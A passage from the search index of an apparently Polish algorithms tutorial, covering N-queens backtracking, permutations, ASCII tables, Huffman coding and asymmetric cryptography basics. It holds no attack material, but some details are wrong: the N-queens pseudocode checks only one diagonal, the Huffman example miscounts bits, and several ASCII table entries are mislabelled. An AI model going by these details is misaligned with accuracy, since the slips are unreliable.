specyfikacji.</p>"},{"location":"algorithms/backtracking/n-queens/#taneczne-przeszukiwanie","title":"Taneczne przeszukiwanie","text":"<p> Taneczne przeszukiwanie</p>"},{"location":"algorithms/backtracking/n-queens/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/backtracking/n-queens/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna, liczba kr\u00f3lowych do rozstawienia</li> </ul>"},{"location":"algorithms/backtracking/n-queens/#wynik","title":"Wynik","text":"<ul> <li>PRAWDA je\u017celi istnieje poprawne rozwi\u0105zanie</li> <li>FA\u0141SZ w przeciwnym przypadku</li> </ul>"},{"location":"algorithms/backtracking/n-queens/#przykad-1","title":"Przyk\u0142ad 1","text":""},{"location":"algorithms/backtracking/n-queens/#dane_1","title":"Dane","text":"<pre><code>n := 3\n</code></pre>"},{"location":"algorithms/backtracking/n-queens/#wynik_1","title":"Wynik","text":"<p>FA\u0141SZ</p>"},{"location":"algorithms/backtracking/n-queens/#przykad-2","title":"Przyk\u0142ad 2","text":""},{"location":"algorithms/backtracking/n-queens/#dane_2","title":"Dane","text":"<pre><code>n := 4\n</code></pre>"},{"location":"algorithms/backtracking/n-queens/#wynik_2","title":"Wynik","text":"<p>PRAWDA</p> <p>Przyk\u0142adowe ustawienie (<code>H</code> oznacza kr\u00f3low\u0105, a <code>-</code> puste pole):</p> <pre><code>- - H -\nH - - -\n- - - H\n- H - -\n</code></pre>"},{"location":"algorithms/backtracking/n-queens/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<p>Idea naszego rozwi\u0105zania jest prosta. B\u0119dziemy przechodzi\u0107 wiersz po wierszu i pr\u00f3bowa\u0107 wszystkie mo\u017cliwe ustawienia kr\u00f3lowych w wierszu. Po ustawieniu kr\u00f3lowej w danym wierszu przechodzimy do kolejnego wiersza, gdzie ponownie sprawdzamy wszystkie mo\u017cliwe ustawienia.</p> <p>Oczywi\u015bcie w ten spos\u00f3b sprawdzaliby\u015bmy wiele b\u0142\u0119dnych ustawie\u0144. Dlatego przed ustawieniem nowej kr\u00f3lowej b\u0119dziemy sprawdza\u0107, czy jest to poprawne ustawienie, tzn. czy to pole nie jest ju\u017c atakowane przez \u017cadn\u0105 inn\u0105 kr\u00f3low\u0105.</p> <p>W celu sprawdzenia, czy dane pole nie jest atakowane przez inn\u0105 kr\u00f3low\u0105, musimy przej\u015b\u0107 przez wszystkie poprzednie wiersze i sprawdzi\u0107, czy kr\u00f3lowa ustawiona w danym wierszu nie atakuje obecnego pola w pionie lub na ukos.</p>"},{"location":"algorithms/backtracking/n-queens/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja Sprawd\u017aPozycj\u0119(wiersz, kolumna, pozycje):\n    1. Dla i := 1 do wiersz - 1, wykonuj:\n        2. Je\u017celi pozycje[i] = kolumna lub kolumna - pozycje[i] = wiersz - i, to:\n            3. Zwr\u00f3\u0107 FA\u0141SZ\n    4. Zwr\u00f3\u0107 PRAWDA\n</code></pre> <pre><code>funkcja Znajd\u017aRozwi\u0105zanie(n, wiersz, pozycje):\n    1. Je\u017celi wiersz &gt; n, to:\n        2. Zwr\u00f3\u0107 PRAWDA\n    3. Dla kolumna := 1 do n, wykonuj:\n        4. Je\u017celi Sprawd\u017aPozycj\u0119(wiersz, kolumna, pozycje), to:\n            5. pozycje[wiersz] := kolumna\n            6. Je\u017celi Znajd\u017aRozwi\u0105zanie(n, wiersz + 1, pozycje), to:\n                7. Zwr\u00f3\u0107 PRAWDA\n    8. Zwr\u00f3\u0107 FA\u0141SZ\n</code></pre>"},{"location":"algorithms/backtracking/n-queens/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"Sprawd\u017aPozycj\u0119(wiersz, kolumna, pozycje)\"]) --&gt; K0[i := 1]\n    K0 --&gt; K1{i &lt; wiersz}\n    K1 -- PRAWDA --&gt; K2{\"pozycje[i] = kolumna\n    lub\n    kolumna - pozycje[i] = wiersz - i\n    lub\n    kolumna - pozycje[i] = i - wiersz\"}\n    K2 -- PRAWDA --&gt; K3[/Zwr\u00f3\u0107 FA\u0141SZ/]\n    K2 -- FA\u0141SZ --&gt; K1i[i := i + 1]\n    K1i --&gt; K1\n    K1 -- FA\u0141SZ --&gt; K4[/Zwr\u00f3\u0107 PRAWDA/]\n    K3 --&gt; STOP([STOP])\n    K4 --&gt; STOP</code></pre> <pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"Znajd\u017aRozwi\u0105zanie(n, wiersz, pozycje)\"]) --&gt; K1{wiersz &gt; n}\n    K1 -- PRAWDA --&gt; K2[/Zwr\u00f3\u0107 PRAWDA/]\n    K2 --&gt; STOP([STOP])\n    K1 -- FA\u0141SZ --&gt; K3p[kolumna := 1]\n    K3p --&gt; K3{kolumna &lt;= n}\n    K3 -- PRAWDA --&gt; K4{\"Sprawd\u017aPozycj\u0119(wiersz, kolumna, pozycje)\"}\n    K4 -- PRAWDA --&gt; K5[\"pozycje[wiersz] := kolumna\"]\n    K5 --&gt; K6{\"Znajd\u017aRozwi\u0105zanie(n, wiersz + 1, pozycje)\"}\n    K6 -- PRAWDA --&gt; K7[/Zwr\u00f3\u0107 PRAWDA/]\n    K7 --&gt; STOP\n    K6 -- FA\u0141SZ --&gt; K3i[kolumna := kolumna + 1]\n    K4 -- FA\u0141SZ --&gt; K3i\n    K3i --&gt; K3\n    K3 -- FA\u0141SZ --&gt; K8[/Zwr\u00f3\u0107 FA\u0141SZ/]\n    K8 --&gt; STOP</code></pre>"},{"location":"algorithms/backtracking/n-queens/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/backtracking/n-queens/#c","title":"C++","text":""},{"location":"algorithms/backtracking/n-queens/#python","title":"Python","text":""},{"location":"algorithms/backtracking/n-queens/#kotlin","title":"Kotlin","text":""},{"location":"algorithms/backtracking/n-queens/#implementacja-pozostae","title":"Implementacja - pozosta\u0142e","text":""},{"location":"algorithms/backtracking/n-queens/#julia","title":"Julia","text":""},{"location":"algorithms/backtracking/permutations/","title":"Permutacje","text":"<p>Permutacja tablicy okre\u015bla jeden ze sposob\u00f3w u\u0142o\u017cenia element\u00f3w tej tablicy. Czasami w algorytmice potrzebujemy wszystkich permutacji tablicy, a wi\u0119c wszystkich mo\u017cliwych sposob\u00f3w na u\u0142o\u017cenie jej element\u00f3w.</p>"},{"location":"algorithms/backtracking/permutations/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/backtracking/permutations/#dane","title":"Dane","text":"<ul> <li>\\(n\\) \u2014 liczba naturalna, liczba element\u00f3w tablicy, \\(n&gt;0\\)</li> <li>\\(A[1..n]\\) - \\(n\\)-elementowa tablica </li> <li>\\(pocz\\), \\(kon\\) - liczby naturalne okre\u015blaj\u0105ce pocz\u0105tek i koniec permutowanego zakresu element\u00f3w tablicy, \\(1&lt;=pocz&lt;=kon&lt;=n\\)</li> </ul>"},{"location":"algorithms/backtracking/permutations/#wynik","title":"Wynik","text":"<ul> <li>Wszystkie permutacje tablicy \\(tab\\)</li> </ul>"},{"location":"algorithms/backtracking/permutations/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<p>Stworzymy algorytm rekurencyjny. Standardowo zaczynamy od warunku stopu rekurencji. Tworzenie obecnej permutacji zako\u0144czymy, gdy przedzia\u0142 zdefiniowany przez zmienne pocz oraz kon nie b\u0119dzie prawid\u0142owy, tzn. gdy pocz\u0105tek b\u0119dzie wi\u0119kszy od ko\u0144ca. B\u0119dzie to oznacza\u0142o, \u017ce mamy sko\u0144czon\u0105 jedn\u0105 permutacj\u0119, wi\u0119c mo\u017cemy j\u0105 wypisa\u0107 na ekran i zako\u0144czy\u0107 obecne wywo\u0142anie funkcji.</p> <p>Gdy warunek stopu nie b\u0119dzie spe\u0142niony, to przejdziemy p\u0119tl\u0105 od pocz\u0105tku do ko\u0144ca zdefiniowanego zakresu. Licznik p\u0119tli b\u0119dzie nas informowa\u0142 o tym, na jakiej pozycji mamy umie\u015bci\u0107 element tablicy z pocz\u0105tku sprawdzanego zakresu. W p\u0119tli b\u0119dziemy wi\u0119c zamienia\u0107 miejscami element tablicy pod obecn\u0105 pozycj\u0105 z elementem z pocz\u0105tku zakresu. Nast\u0119pnie skorzystamy z wywo\u0142ania rekurencyjnego ze zwi\u0119kszon\u0105 o jeden warto\u015bci\u0105 pocz\u0105tku zakresu. Po wywo\u0142aniu rekurencyjnym zamienimy ponownie miejscami element na obecnej pozycji z elementem z pocz\u0105tku przedzia\u0142u, tak by przywr\u00f3ci\u0107 poprzedni uk\u0142ad element\u00f3w w tablicy.</p>"},{"location":"algorithms/backtracking/permutations/#pseudokod","title":"Pseudokod","text":"<pre><code>procedura Permutacje(A, pocz, kon):\n    1. Je\u017celi pocz &gt; kon, to:\n        2. Wypisz A\n        3. Zako\u0144cz\n    4. Dla i := pocz do kon, wykonuj:\n        5. Zamie\u0144(A[pocz], A[i])\n        6. Permutacje(A, pocz + 1, kon)\n        7. Zamie\u0144(A[pocz], A[i])\n</code></pre>"},{"location":"algorithms/backtracking/permutations/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"Permutacje(A, pocz, kon)\"]) --&gt; K1{pocz &gt; kon}\n    K1 -- PRAWDA --&gt; K2[/Wypisz A/]\n    K2 --&gt; STOP([STOP])\n    K1 -- FA\u0141SZ --&gt; K4p[i := pocz]\n    K4p --&gt; K4{i &lt;= kon}\n    K4 -- PRAWDA --&gt; K5[\"Zamie\u0144(A[pocz], A[i])\n    Permutacje(A, pocz + 1, kon)\n    Zamie\u0144(A[pocz], A[i])\"]\n    K5 --&gt; K4i[i := i + 1]\n    K4i --&gt; K4\n    K4 -- FA\u0141SZ --&gt; STOP</code></pre>"},{"location":"algorithms/backtracking/permutations/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/backtracking/permutations/#python","title":"Python","text":""},{"location":"algorithms/backtracking/permutations/#kotlin","title":"Kotlin","text":""},{"location":"algorithms/coding-and-compression/","title":"Kodowanie i kompresja","text":"<p>Wszystkie dane zapisane w pami\u0119ci komputera reprezentowane s\u0105 w postaci liczb binarnych. Komputer operuje na ci\u0105gach zer i jedynek, tak\u017ce podczas przetwarzania tekstu. Dlatego wa\u017cne jest kodowanie, kt\u00f3re okre\u015bla, w jaki spos\u00f3b nale\u017cy interpretowa\u0107 bity z pami\u0119ci komputera i w jaki spos\u00f3b zapisywa\u0107 r\u00f3\u017cne dane w postaci bit\u00f3w. Kodowanie okre\u015bla tak\u017ce rodzaj informacji, np. znak\u00f3w, jakie mo\u017cemy reprezentowa\u0107 na komputerze. Nieraz mo\u017cemy spotka\u0107 si\u0119 z tym, \u017ce niekt\u00f3re symbole, takie jak znaki z polskiego alfabetu, nie wy\u015bwietlaj\u0105 si\u0119 poprawnie. Jest to w\u0142a\u015bnie zwi\u0105zane z systemem kodowania.</p> <p>Nie tylko sam spos\u00f3b zapisywania i interpretacji danych jest jednak wa\u017cny. Innym istotnym aspektem jest tak\u017ce dbanie o optymalne wykorzystanie pami\u0119ci urz\u0105dzenia. W obecnych czasach pracujemy z coraz wi\u0119kszymi zbiorami danych, kt\u00f3re zamiast kilkudziesi\u0119ciu kilobajt\u00f3w zajmuj\u0105 cz\u0119sto dziesi\u0105tki, jak nie setki gigabajt\u00f3w. Mi\u0119dzy innymi z tego wzgl\u0119du istotna jest efektywna kompresja danych, kt\u00f3ra pozwala zmniejszy\u0107 ilo\u015b\u0107 miejsca w pami\u0119ci urz\u0105dzenia potrzebn\u0105 do zapisania danych. Innymi s\u0142owy kompresja sprawia, \u017ce wykorzystujemy mniejsz\u0105 liczb\u0119 bit\u00f3w do reprezentacji informacji.</p>"},{"location":"algorithms/coding-and-compression/ascii/","title":"Kod ASCII","text":"<p>ASCII, czyli American Standard Code for Information Interchange, to standard kodowania znak\u00f3w u\u017cywany w komputerach i urz\u0105dzeniach komunikacyjnych do reprezentowania tekstu. Tablica ASCII przypisuje numery (kody) do r\u00f3\u017cnych znak\u00f3w, takich jak litery, cyfry, znaki interpunkcyjne oraz inne symbole. Istniej\u0105 dwie wersje tablicy ASCII: podstawowa i rozszerzona.</p> <ol> <li>Podstawowa tablica ASCII: zawiera 128 znak\u00f3w, kt\u00f3re obejmuj\u0105 angielskie litery (zar\u00f3wno ma\u0142e, jak i du\u017ce), cyfry, znaki interpunkcyjne oraz kontrolne. Znaki te s\u0105 reprezentowane przez 7-bitowe kody binarne, co pozwala na ich zakodowanie w zakresie od 0 do 127.</li> <li>Rozszerzona tablica ASCII: rozszerza podstawow\u0105 tablic\u0119 do 256 znak\u00f3w, dodaj\u0105c dodatkowe symbole, znaki specjalne i akcentowane litery u\u017cywane w r\u00f3\u017cnych j\u0119zykach. Te dodatkowe znaki s\u0105 reprezentowane przez 8-bitowe kody binarne, co umo\u017cliwia ich zakodowanie w zakresie od 128 do 255.</li> </ol>"},{"location":"algorithms/coding-and-compression/ascii/#podstawowa-tablica-ascii","title":"Podstawowa tablica ASCII","text":"Liczba Znak Opis 0 Nul zero 1 SQH pocz\u0105tek nag\u0142\u00f3wka 2 STX pocz\u0105tek tekstu 3 ETX koniec tekstu 4 EOT koniec transmisji 5 ENQ wywo\u0142anie stacji 6 ACK potwierdzenie 7 BEL dzwonek 8 BS backspace 9 HT tabulacja pozioma 10 LF przesuni\u0119cie o jeden wiersz 11 FT tabulacja pionowa 12 FF przesuni\u0119cie o jedn\u0105 stron\u0119 13 CR powr\u00f3t karetki - ENTER 14 SO wyj\u015bcie 15 SI wej\u015bcie 16 DLE pomini\u0119cie znak\u00f3w steruj\u0105cych 17 DC1 sterowanie urz\u0105dzenia 1 18 DC2 sterowanie urz\u0105dzenia 2 19 DC3 sterowanie urz\u0105dzenia 3 20 DC4 sterowanie urz\u0105dzenia 4 21 NAC potwierdzenie negatywne 22 SYN synchronizacja 23 ETB koniec bloku 24 CAN anulowanie 25 EM koniec no\u015bnika 26 SUB zast\u0105pienie 27 ESC escape 28 FS poprzedza dane alfanumeryczne 29 GS poprzedza dane binarne 30 RS separator rekord\u00f3w 31 US separator pozycji 32 SP spacja 33 ! 34 \" 35 # 36 $ 37 % 38 &amp; 39 ' 40 ( 41 ) 42 * 43 + 44 , 45 - 46 . 47 / 48 0 49 1 50 2 51 3 52 4 53 5 54 6 55 7 56 8 57 9 58 : 59 ; 60 &lt; 61 = 62 &gt; 63 ? 64 @ 65 A 66 B 67 C 68 D 69 E 70 F 71 G 72 H 73 I 74 J 75 K 76 L 77 M 78 N 79 O 80 P 81 Q 82 R 83 S 84 T 85 U 86 V 87 W 88 X 89 Y 90 Z 91 [ 92 \\ 93 ] 94 ^ 95 _ 96 ` 97 a 98 b 99 c 100 d 101 e 102 f 103 g 104 h 105 i 106 j 107 k 108 l 109 m 110 n 111 o 112 p 113 q 114 r 115 s 116 t 117 u 118 v 119 w 120 x 121 y 122 z 123 { 124 | 125 } 126 ~ 127 DEL"},{"location":"algorithms/coding-and-compression/ascii/#rozszerzona-tablica-ascii-od-znaku-o-numerze-128","title":"Rozszerzona tablica ASCII (od znaku o numerze 128)","text":"Liczba Znak Opis 128 \u00c7 Latin Capital Letter C With Cedilla 129 \u00fc Latin Small Letter U With Diaeresis 130 \u00e9 Latin Small Letter E With Acute 131 \u00e2 Latin Small Letter A With Circumflex 132 \u00e4 Latin Small Letter A With Diaeresis 133 \u00e0 Latin Small Letter A With Grave 134 \u00e5 Latin Small Letter A With Ring Above 135 \u00e7 Latin Small Letter C With Cedilla 136 \u00ea Latin Small Letter E With Circumflex 137 \u00eb Latin Small Letter E With Diaeresis 138 \u00e8 Latin Small Letter E With Grave 139 \u00ef Latin Small Letter I With Diaeresis 140 \u00ee Latin Small Letter I With Circumflex 141 \u00ec Latin Small Letter I With Grave 142 \u00c4 Latin Capital Letter A With Diaeresis 143 \u00c5 Latin Capital Letter A With Ring Above 144 \u00c9 Latin Capital Letter E With Acute 145 \u00a7 Latin Small Letter Ae 146 \u00c6 Latin Capital Letter Ae 147 \u00f4 Latin Small Letter O With Circumflex 148 \u00f6 Latin Small Letter O With Diaeresis 149 \u00f2 Latin Small Letter O With Grave 150 \u00fb Latin Small Letter U With Circumflex 151 \u00f9 Latin Small Letter U With Grave 152 \u00ff Latin Small Letter Y With Diaeresis 153 \u00d6 Latin Capital Letter O With Diaeresis 154 \u00dc Latin Capital Letter U With Diaeresis 155 \u00a2 Cent Sign 156 \u00a3 Pound Sign, Pound Sterling, Irish Punt, Lira Sign 157 \u00a5 Yen Sign, Yuan Sign 158 \u20a7 Peseta Sign 159 \u0192 Latin Small Letter F With Hook, Florin Currency Symbol, Function Symbol 160 \u00e1 Latin Small Letter A With Acute 161 \u00ed Latin Small Letter I With Acute 162 \u00f3 Latin Small Letter O With Acute 163 \u00fa Latin Small Letter U With Acute 164 \u00f1 Latin Small Letter N With Tilde, Small Letter Enye 165 \u00d1 Latin Capital Letter N With Tilde, Capital Letter Enye 166 \u00aa Feminine Ordinal Indicator 167 \u00ba Masculine Ordinal Indicator 168 \u00bf Inverted Question Mark, Turned Question Mark 169 \u2310 Reversed Not Sign, Beginning Of Line 170 \u00ac Not Sign, Angled Dash 171 \u00bd Vulgar Fraction One Half 172 \u00bc Vulgar Fraction One Quarter 173 \u00a1 Inverted Exclamation Mark 174 \u00ab Left-Pointing Double Angle Quotation Mark, Left Guillemet, Chevrons 175 \u00bb Right-Pointing Double Angle Quotation Mark, Right Guillemet 176 \u2591 Light Shade 177 \u2592 Medium Shade, Speckles Fill, Dotted Fill 178 \u2593 Dark Shade 179 \u2502 Box Drawings Light Vertical 180 \u2524 Box Drawings Light Vertical And Left 181 \u2561 Box Drawings Vertical Single And Left Double 182 \u2562 Box Drawings Vertical Double And Left Single 183 \u2556 Box Drawings Down Double And Left Single 184 \u2555 Box Drawings Down Single And Left Double 185 \u2563 Box Drawings Double Vertical And Left 186 \u2551 Box Drawings Double Vertical 187 \u2557 Box Drawings Double Down And Left 188 \u255d Box Drawings Double Up And Left 189 \u255c Box Drawings Up Double And Left Single 190 \u255b Box Drawings Up Single And Left Double 191 \u2510 Box Drawings Light Down And Left 192 \u2514 Box Drawings Light Up And Right 193 \u2534 Box Drawings Light Up And Horizontal 194 \u251c Box Drawings Light Down And Horizontal 195 \u251c Box Drawings Light Vertical And Right 196 \u2500 Box Drawings Light Horizontal 197 \u253c Box Drawings Light Vertical And Horizontal 198 \u255e Box Drawings Vertical Single And Right Double 199 \u255f Box Drawings Vertical Double And Right Single 200 \u255a Box Drawings Double Up And Right 201 \u2554 Box Drawings Double Down And Right 202 \u2569 Box Drawings Double Up And Horizontal 203 \u2566 Box Drawings Double Down And Horizontal 204 \u2560 Box Drawings Double Vertical And Right 205 \u2550 Box Drawings Double Horizontal 206 \u256c Box Drawings Double Vertical And Horizontal 207 \u2567 Box Drawings Up Single And Horizontal Double 208 \u2568 Box Drawings Up Double And Horizontal Single 209 \u2564 Box Drawings Down Single And Horizontal Double 210 \u2565 Box Drawings Down Double And Horizontal Single 211 \u2559 Box Drawings Up Double And Right Single 212 \u2558 Box Drawings Up Single And Right Double 213 \u2552 Box Drawings Down Single And Right Double 214 \u2553 Box Drawings Down Double And Right Single 215 \u256b Box Drawings Vertical Double And Horizontal Single 216 \u256a Box Drawings Vertical Single And Horizontal Double 217 \u2518 Box Drawings Light Up And Left 218 \u250c Box Drawings Light Down And Right 219 \u2588 Full Block, Solid Block 220 \u2584 Lower Half Block 221 \u258c Left Half Block 222 \u2590 Right Half Block 223 \u2580 Upper Half Block 224 \u03b1 Greek Small Letter Alpha 225 \u00df Latin Small Letter Sharp S, Eszett 226 \u0393 Greek Capital Letter Gamma 227 \u03c0 Greek Small Letter Pi 228 \u03a3 Greek Capital Letter Sigma 229 \u03c3 Greek Small Letter Sigma 230 \u00b5 Micro Sign 231 \u03c4 Greek Capital Letter Tau 232 \u03a6 Greek Capital Letter Phi 233 \u0398 Greek Capital Letter Theta 234 \u03a9 Greek Capital Letter Omega 235 \u03b4 Greek Small Letter Delta 236 \u221e Infinity 237 \u03c6 Greek Small Letter Phi 238 \u03b5 Greek Small Letter Epsilon 239 \u2229 Intersection 240 \u2261 Identical To 241 \u00b1 Plus-Minus Sign 242 \u2265 Greater-Than Or Equal To 243 \u2264 Less-Than Or Equal To 244 \u2320 Top Half Integral 245 \u2321 Bottom Half Integral 246 \u00f7 Division Sign, Obelus 247 \u2248 Almost Equal To, Asymptotic To 248 \u00b0 Degree Sign 249 \u2219 Bullet Operator 250 \u00b7 Middle Dot, Interpunct 251 \u221a Square Root, Radical Sign 252 \u207f Superscript Latin Small Letter N 253 \u00b2 Superscript Two, Squared 254 \u25a0 Black Square 255 Non-Breaking Space, NBSP"},{"location":"algorithms/coding-and-compression/ascii/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/coding-and-compression/ascii/#c","title":"C++","text":""},{"location":"algorithms/coding-and-compression/ascii/#python","title":"Python","text":""},{"location":"algorithms/coding-and-compression/huffman-coding/","title":"Kody Huffmana","text":"<p>Kody Huffmana to jeden z algorytm\u00f3w kompresji, kt\u00f3ry polega na wygenerowaniu kod\u00f3w dla poszczeg\u00f3lnych znak\u00f3w bazuj\u0105c na cz\u0119stotliwo\u015bci wyst\u0119powania tych znak\u00f3w w kompresowanych danych. W ramach algorytmu tworzymy drzewo binarne jednoznacznych kod\u00f3w. Co to znaczy, \u017ce powsta\u0142e kody s\u0105 jednoznaczne? Oznacza to, \u017ce skompresowane dane mo\u017cemy odkodowa\u0107 tylko na jeden spos\u00f3b.</p>"},{"location":"algorithms/coding-and-compression/huffman-coding/#przykad","title":"Przyk\u0142ad","text":"<p>Poka\u017cemy proces tworzenia drzewa kod\u00f3w dla wyrazu papuga.</p> <p>Zaczynamy od zliczenia liczby wyst\u0105pie\u0144 ka\u017cdej litery. Nast\u0119pnie dla ka\u017cdej litery tworzymy w\u0119ze\u0142 zawieraj\u0105cy liter\u0119 oraz liczb\u0119 jej wyst\u0105pie\u0144. W\u0119z\u0142y sortujemy malej\u0105co po liczbie wyst\u0105pie\u0144.</p> <pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    A((A: 2))\n    P((P: 2))\n    U((U: 1))\n    G((G: 1))</code></pre> <p>Bierzemy dwa w\u0119z\u0142y o najmniejszych warto\u015bciach i \u0142\u0105czymy je tworz\u0105c nowy w\u0119ze\u0142 rodzica, kt\u00f3ry zawiera warto\u015b\u0107 r\u00f3wn\u0105\u00a0sumie liczebno\u015bci swoich dzieci. Nowy w\u0119ze\u0142 wrzucamy do listy, a dzieci z niej usuwamy. Pami\u0119tamy o zachowaniu malej\u0105cego porz\u0119dku w li\u015bcie w\u0119z\u0142\u00f3w.</p> <pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    A((A: 2))\n    P((P: 2))\n    UG((2)) -- 0 --&gt; U\n    UG -- 1 --&gt; G\n    U((U: 1))\n    G((G: 1))</code></pre> <p>Ponownie bierzemy dwa w\u0119z\u0142y o najmniejszych warto\u015bciach i \u0142\u0105czymy je.</p> <pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    P((P: 2))\n    PUG((4)) -- 0 --&gt; P\n    PUG -- 1 --&gt; UG\n    UG((2)) -- 0 --&gt; U\n    UG -- 1 --&gt; G\n    U((U: 1))\n    G((G: 1))\n    A((A: 2))</code></pre> <p>Pozostaje nam po\u0142\u0105czy\u0107 ze sob\u0105 dwa pozosta\u0142e w\u0119z\u0142y.</p> <pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    PUGA((6)) -- 0 --&gt; PUG\n    PUGA -- 1 --&gt; A\n    P((P: 2))\n    PUG((4)) -- 0 --&gt; P\n    PUG -- 1 --&gt; UG\n    UG((2)) -- 0 --&gt; U\n    UG -- 1 --&gt; G\n    U((U: 1))\n    G((G: 1))\n    A((A: 2))</code></pre> <p>Teraz mo\u017cemy odczyta\u0107 powsta\u0142e w ten spos\u00f3b kody.</p> Znak Kod A 1 P 00 U 010 G 011 <p>Za pomoc\u0105 tabeli kod\u00f3w kodujemy wyraz papuga: </p> <p>\\(001000100111\\)</p> <p>Wyrazy zosta\u0142 zakodowany na trzynastu bitach. Gdyby\u015bmy u\u017cyli kodowania ASCII to wyraz zosta\u0142by zakodowany na czterdziestu o\u015bmiu bitach (ka\u017cdy znak na o\u015bmiu bitach).</p>"},{"location":"algorithms/coding-and-compression/huffman-coding/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/coding-and-compression/huffman-coding/#c","title":"C++","text":""},{"location":"algorithms/coding-and-compression/huffman-coding/#python","title":"Python","text":""},{"location":"algorithms/cryptography/","title":"Szyfrowanie","text":""},{"location":"algorithms/cryptography/#sowniczek-pojec","title":"S\u0142owniczek poj\u0119\u0107","text":"<ul> <li>Tekst jawny (tekst otwarty) - wiadomo\u015b\u0107 przed zaszyfrowaniem, lub po odszyfrowaniu.</li> <li>Szyfrogram (kryptogram) - zaszyfrowana wiadomo\u015b\u0107.</li> </ul>"},{"location":"algorithms/cryptography/assymetric/","title":"Szyfrowanie asymetryczne","text":"<p>Kryptografia asymetryczna, nazywana tak\u017ce kryptografi\u0105 z kluczem publicznym, jest metod\u0105 szyfrowania, kt\u00f3ra u\u017cywa dw\u00f3ch kluczy: jednego publicznego do szyfrowania informacji i jednego prywatnego do jej deszyfrowania. Ze wzgl\u0119du na t\u0119 dwukluczow\u0105 natur\u0119, kryptografia asymetryczna ma wiele zastosowa\u0144, takich jak podpisy cyfrowe czy wymiana kluczy.</p>"},{"location":"algorithms/cryptography/assymetric/#podstawowe-zasady","title":"Podstawowe zasady","text":"<ol> <li>Dwa klucze: istniej\u0105 dwa klucze \u2013 publiczny i prywatny. Klucz publiczny jest udost\u0119pniany otwarcie, podczas gdy klucz prywatny jest trzymany w tajemnicy przez jego w\u0142a\u015bciciela.</li> <li>Bezpiecze\u0144stwo: nawet je\u015bli atakuj\u0105cy ma dost\u0119p do klucza publicznego i szyfrogramu, nie powinien by\u0107 w stanie odszyfrowa\u0107 wiadomo\u015bci bez klucza prywatnego.</li> <li>Nieodwracalno\u015b\u0107: wiadomo\u015b\u0107 zaszyfrowan\u0105 kluczem publicznym mo\u017cna odszyfrowa\u0107 tylko odpowiednim kluczem prywatnym, i odwrotnie.</li> </ol>"},{"location":"algorithms/cryptography/assymetric/#zastosowania","title":"Zastosowania","text":"<ol> <li>Szyfrowanie: dowolna osoba mo\u017ce zaszyfrowa\u0107 wiadomo\u015b\u0107 przy u\u017cyciu klucza publicznego odbiorcy. Tylko odbiorca, posiadaj\u0105cy odpowiedni klucz prywatny, mo\u017ce odszyfrowa\u0107 wiadomo\u015b\u0107.</li> <li>Podpisy cyfrowe: za pomoc\u0105 swojego klucza prywatnego nadawca mo\u017ce stworzy\u0107 podpis cyfrowy, kt\u00f3ry mo\u017ce by\u0107 weryfikowany przez ka\u017cdego, kto ma dost\u0119p do sparowanego klucza publicznego.</li> <li>Wymiana kluczy: protoko\u0142y takie jak Diffie-Hellman umo\u017cliwiaj\u0105 dw\u00f3m stronom wygenerowanie wsp\u00f3lnego tajnego klucza na podstawie ich par kluczy publicznych/prywatnych, bez konieczno\u015bci bezpo\u015bredniego przekazywania informacji.</li> </ol>"},{"location":"algorithms/cryptography/assymetric/#popularne-algorytmy","title":"Popularne algorytmy","text":"<ol> <li>RSA: jeden z pierwszych i najcz\u0119\u015bciej stosowanych algorytm\u00f3w kryptografii asymetrycznej. Stosowany zar\u00f3wno do szyfrowania, jak i podpis\u00f3w cyfrowych.</li> <li>Diffie-Hellman: u\u017cywany g\u0142\u00f3wnie do wymiany kluczy.</li> <li>Elliptic Curve Cryptography (ECC): oferuje podobny poziom bezpiecze\u0144stwa jak RSA, ale przy znacznie kr\u00f3tszych kluczach.</li> </ol>"},{"location":"algorithms/cryptography/assymetric/#bezpieczenstwo","title":"Bezpiecze\u0144stwo","text":"<ol> <li>D\u0142ugo\u015b\u0107 Klucza: bezpiecze\u0144stwo kryptografii asymetrycznej jest cz\u0119sto uzale\u017cnione od d\u0142ugo\u015bci klucza. D\u0142u\u017csze klucze s\u0105 zazwyczaj bardziej bezpieczne, ale wymagaj\u0105 wi\u0119cej zasob\u00f3w do przetwarzania.</li> <li>Ataki: kryptografia asymetryczna nie jest odporna na wszystkie ataki. Istniej\u0105 metody atakowania kryptosystem\u00f3w, takie jak ataki przez faktoryzacj\u0119 dla RSA.</li> <li>Prywatno\u015b\u0107 klucza: bezpieczne przechowywanie klucza prywatnego jest kluczowe. Je\u015bli klucz prywatny zostanie skompromitowany, bezpiecze\u0144stwo wszystkich operacji przeprowadzanych przy jego u\u017cyciu jest nara\u017cone.</li> </ol>"},{"location":"algorithms/cryptography/assymetric/#wnioski","title":"Wnioski","text":"<p>Kryptografia asymetryczna przynios\u0142a rewolucj\u0119 w dziedzinie bezpiecze\u0144stwa cyfrowego, umo\u017cliwiaj\u0105c bezpieczn\u0105 wymian\u0119 informacji w otwartych sieciach, takich jak Internet. Jest podstaw\u0105 wielu aspekt\u00f3w wsp\u00f3\u0142czesnego bezpiecze\u0144stwa cyfrowego, w tym certyfikat\u00f3w SSL/TLS, podpis\u00f3w cyfrowych i wielu system\u00f3w uwierzytelniania. O ile, gdy prawid\u0142owo 